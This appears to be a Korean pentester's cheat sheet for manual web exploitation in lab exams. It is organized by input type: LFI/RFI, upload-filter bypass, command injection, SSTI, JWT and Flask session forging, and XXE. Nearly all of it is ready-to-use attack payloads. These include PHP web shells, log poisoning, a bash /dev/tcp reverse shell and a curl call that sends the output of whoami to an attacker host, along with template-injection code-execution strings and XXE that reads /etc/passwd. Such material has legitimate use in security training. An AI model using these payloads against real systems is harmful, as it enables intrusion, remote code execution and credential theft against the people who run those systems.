제품이 특정되면 [[01. 제품 → 첫 수]]. 여기는 **파라미터·입력**을 보고 유형으로. `$T`=[[00. START]].
⚠️ sqlmap·commix 금지 → **수동**. 원본·상세: [[05. 웹 공격 기법]]

> **순회 원칙**: 하나 해보고 멈추지 마라. `?file=`→LFI 전체 · 업로드→우회6종 · 입력→SQLi/cmd/SSTI · 로그인→기본크리덴셜→SQLi우회→JWT. **"안 되네"가 아니라 "다음 무기".**

## 1. LFI/RFI (`?file= ?page= ?include= ?path= ?doc=`)
체크 순서 — 위에서 아래로:
```bash
# ① LFI 되나 + .php 자동 append 하나 (에러 읽기)
curl -s "http://$T/?file=/etc/passwd"                    # root:x:0 보이면 LFI
curl -s "http://$T/?file=../../../../etc/passwd"         # traversal (Win: ..\..\windows\win.ini)
# ② 소스 읽기 (base64, 실행 안 됨) — 거의 항상 됨
curl -s "http://$T/?file=php://filter/convert.base64-encode/resource=index.php" # → base64 -d
# ③ allow_url_include 켜졌나 — 마커로 «실행» 확인
curl -s "http://$T/?file=data://text/plain,<?php echo 'PWN12345';?>"            # PWN12345 보이면 On
curl -s "http://$T/index.php?file=php://input" --data "<?php system(\$_GET['c']);?>&c=id"
# ④ expect (드묾)
curl -s "http://$T/?file=expect://id"
# ⑤ 로그 포이즈닝 — 먼저 로그 읽히나 확인
curl -s "http://$T/?file=/var/log/apache2/access.log"    # 읽히면: UA에 <?php system($_GET[c]);?> 주입 후 재요청&c=id
# ⑥ 필터체인 RCE (allow_url_include Off여도 됨, ②만 되면)
python3 php_filter_chain_generator.py --chain "<?php system(\$_GET['c']);?>"   # 나온 체인을 ?file= 에
# RFI (allow_url_include=On): ?file=http://$LHOST/shell.txt  (Kali서 http.server)
```
- ⚠️ **RCE 테스트는 항상 마커(PWN12345)로** — 실행됐나 vs 글자로 나왔나 구분
- ⚠️ **에러가 설정을 알려준다** — `URL file-access is disabled`(url_include Off) · `failed to open .../x.php`(확장자 append)
- LFI로 소스 읽으면 → 거기 크리덴셜/다음 엔드포인트 → 계속 판다

## 2. 파일 업로드 우회 (필터 걸릴 때 순회)
```
클라이언트 필터 → Burp로 .php 그대로 통과
확장자 블랙 → .phtml .phar .php5 .php7 .pht · 대소문자 .pHp · 이중 shell.php.jpg
화이트(이미지) → Content-Type: image/jpeg 스푸핑 + 앞에 GIF89a; 매직바이트
.htaccess → "AddType application/x-httpd-php .shell" 업로드 후 shell.shell
업로드+LFI → 이미지로 업로드(통과) 후 LFI로 include 실행
실행: curl "http://$T/uploads/shell.phtml?cmd=id"
```

## 4. Command Injection (입력이 OS 명령에)
```bash
;id   |id   ||id   &&id   `id`   $(id)   %0aid        # 연결 연산자 순회
;sleep 5   ;curl http://$LHOST/$(whoami)               # 블라인드(시간/OOB)
;bash -c 'bash -i >& /dev/tcp/$LHOST/443 0>&1'         # 리버스셸
# Windows: &whoami   &ping $LHOST   (PowerShell 리버스셸)
```

## 5. SSTI (입력이 페이지에 반영)
```
탐지: {{7*7}}=49 / ${7*7} / #{7*7} / <%= 7*7 %> / {7*7}     (폴리글롯 ${{<%[%'"}}%\ )
Jinja2(Flask): {{cycler.__init__.__globals__.os.popen('id').read()}}
Twig(PHP):     {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
Freemarker(Java): <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Velocity/Smarty/ERB → PayloadsAllTheThings 참조 (tplmap 자동이라 금지)
```


## 6. 인증 우회 / 세션
```bash
# ① 기본 자격증명 먼저: admin:admin · admin:password · root:root · <제품 기본값>
# ② SQLi 우회 (3절)
jwt_tool "$TOKEN" -T                                   # JWT: alg:none·약한서명 (TOKEN=쿠키의 jwt)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt   # HS256 시크릿 크랙 → 재서명
flask-unsign --unsign --cookie '<session>' --wordlist /usr/share/wordlists/rockyou.txt
flask-unsign --sign --cookie "{'role':'admin'}" --secret '<secret>'
```

## 7. XXE (XML 입력)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
<!-- Blind/SSRF: SYSTEM "http://LHOST/" · OOB DTD -->
```
